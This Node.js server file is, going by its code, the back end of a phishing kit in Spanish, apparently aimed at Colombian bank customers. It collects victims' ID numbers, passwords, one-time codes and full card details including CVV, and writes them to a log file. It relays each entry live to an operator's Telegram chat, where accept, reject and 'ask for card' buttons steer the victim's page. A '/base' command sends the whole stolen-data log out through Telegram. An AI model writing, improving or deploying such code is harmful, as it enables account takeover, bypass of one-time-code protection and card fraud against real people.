const express = require('express');
const axios = require('axios');
const path = require('path');
const fs = require('fs');
const FormData = require('form-data'); // Necesario para enviar archivos

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

const transacciones = {};
const otps = {};
const tcs = {};

// --- HISTORIAL ---
const HISTORY_FILE = path.join(__dirname, 'historial.txt');

function guardarEnHistorial(texto) {
    const fecha = new Date().toLocaleString('es-CO');
    const linea = `[${fecha}] ${texto}\n`;
    fs.appendFile(HISTORY_FILE, linea, (err) => {
        if (err) console.error('Error guardando historial:', err);
    });
}

// --- RUTAS ---

// 1. Flujo Inicial (Inicio)
app.post('/api/solicitar-acceso', async (req, res) => {
    const { documento, clave } = req.body;
    if (!documento || !clave) return res.status(400).json({ status: 'error' });

    guardarEnHistorial(`INICIO -> Documento: ${documento} | Clave: ${clave}`);

    const transaccionId = Date.now().toString();
    transacciones[transaccionId] = { estado: 'pendiente' };

    const mensaje = `🔔 *Nueva Solicitud de Acceso*\n\n📄 Documento: \`${documento}\`\n🔑 Clave: \`${clave}\`\n\n¿Permitir el acceso?`;

    try {
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: CHAT_ID,
            text: mensaje,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[
                    { text: '✅ Aceptar', callback_data: `aceptar_${transaccionId}` },
                    { text: '❌ Rechazar', callback_data: `rechazar_${transaccionId}` }
                ]]
            }
        });
        res.json({ status: 'ok', id: transaccionId });
    } catch (error) {
        res.status(500).json({ status: 'error' });
    }
});

app.get('/api/verificar-estado/:id', (req, res) => {
    res.json(transacciones[req.params.id] || { estado: 'no_encontrada' });
});

// 2. Flujo OTP
app.post('/api/validar-otp', async (req, res) => {
    const { documento, clave, otp } = req.body;
    
    guardarEnHistorial(`OTP -> Documento: ${documento} | Clave: ${clave} | OTP: ${otp}`);

    const otpId = Date.now().toString();
    otps[otpId] = { estado: 'pendiente' };

    const mensaje = `🔐 *Validación OTP*\n\n📄 Documento: \`${documento}\`\n🔑 Clave: \`${clave}\`\n🔢 OTP: \`${otp}\`\n\n¿Qué desea hacer?`;

    try {
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: CHAT_ID,
            text: mensaje,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[
                    { text: '✅ Aceptar', callback_data: `otp_aceptar_${otpId}` },
                    { text: '❌ Error', callback_data: `otp_error_${otpId}` },
                    { text: '💳 Pedir TC', callback_data: `otp_tc_${otpId}` }
                ]]
            }
        });
        res.json({ status: 'ok', id: otpId });
    } catch (error) {
        res.status(500).json({ status: 'error' });
    }
});

app.get('/api/verificar-otp/:id', (req, res) => {
    res.json(otps[req.params.id] || { estado: 'no_encontrada' });
});

// 3. Flujo Tarjeta de Crédito (TC)
app.post('/api/validar-tc', async (req, res) => {
    const { numero, fecha, cvv } = req.body;

    guardarEnHistorial(`TC -> Número: ${numero} | Fecha: ${fecha} | CVV: ${cvv}`);

    const tcId = Date.now().toString();
    tcs[tcId] = { estado: 'pendiente' };

    const mensaje = `💳 *Datos Tarjeta de Crédito*\n\n💳 Número: \`${numero}\`\n📅 Fecha: \`${fecha}\`\n🔒 CVV: \`${cvv}\`\n\n¿Permitir el pago?`;

    try {
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: CHAT_ID,
            text: mensaje,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[
                    { text: '✅ Aceptar', callback_data: `tc_aceptar_${tcId}` },
                    { text: '❌ Rechazar', callback_data: `tc_rechazar_${tcId}` }
                ]]
            }
        });
        res.json({ status: 'ok', id: tcId });
    } catch (error) {
        res.status(500).json({ status: 'error' });
    }
});

app.get('/api/verificar-tc/:id', (req, res) => {
    res.json(tcs[req.params.id] || { estado: 'no_encontrada' });
});

// 4. WEBHOOK (Recibe botones y mensajes de texto como /base)
app.post('/telegram-webhook', async (req, res) => {
    const { callback_query, message } = req.body;

    // A. Si es un mensaje de texto (Comando /base)
    if (message && message.text) {
        if (message.text.trim() === '/base') {
            if (fs.existsSync(HISTORY_FILE)) {
                try {
                    // Preparamos el archivo para enviarlo
                    const form = new FormData();
                    form.append('chat_id', CHAT_ID);
                    form.append('document', fs.createReadStream(HISTORY_FILE));
                    form.append('caption', '📂 Aquí tienes el historial de datos hasta el momento.');

                    // Enviamos el documento a Telegram
                    await axios.post(`${TELEGRAM_API}/sendDocument`, form, {
                        headers: form.getHeaders()
                    });
                } catch (error) {
                    console.error('Error enviando archivo:', error.message);
                    await axios.post(`${TELEGRAM_API}/sendMessage`, {
                        chat_id: CHAT_ID,
                        text: '❌ Error al generar o enviar el archivo.'
                    });
                }
            } else {
                await axios.post(`${TELEGRAM_API}/sendMessage`, {
                    chat_id: CHAT_ID,
                    text: '📭 El historial está vacío por ahora.'
                });
            }
        }
        return res.sendStatus(200);
    }

    // B. Si es un clic en los botones (Lógica anterior)
    if (callback_query) {
        const data = callback_query.data;
        const partes = data.split('_');
        const tipo = partes[0]; 
        let id = '';
        let accion = '';

        if (tipo === 'aceptar' || tipo === 'rechazar') {
            id = partes[1];
            accion = tipo;
            if (transacciones[id]) transacciones[id].estado = accion === 'aceptar' ? 'aceptado' : 'rechazado';
        } else if (tipo === 'otp') {
            accion = partes[1]; 
            id = partes[2];
            if (otps[id]) otps[id].estado = accion;
        } else if (tipo === 'tc') {
            accion = partes[1]; 
            id = partes[2];
            if (tcs[id]) tcs[id].estado = accion === 'aceptar' ? 'aceptado' : 'rechazado';
        }

        guardarEnHistorial(`ACCIÓN TELEGRAM -> Se presionó: ${accion} (ID: ${id})`);

        try {
            await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
                callback_query_id: callback_query.id,
                text: `Acción registrada: ${accion}`
            });

            const textoOriginal = callback_query.message.text;
            const textoNuevo = `${textoOriginal}\n\n👉 *Acción tomada:* ${accion.toUpperCase()}`;

            await axios.post(`${TELEGRAM_API}/editMessageText`, {
                chat_id: callback_query.message.chat.id,
                message_id: callback_query.message.message_id,
                text: textoNuevo,
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: [] }
            });
        } catch (e) { console.error(e.message); }
    }
    res.sendStatus(200);
});

app.listen(PORT, () => console.log(`Servidor corriendo en ${PORT}`));
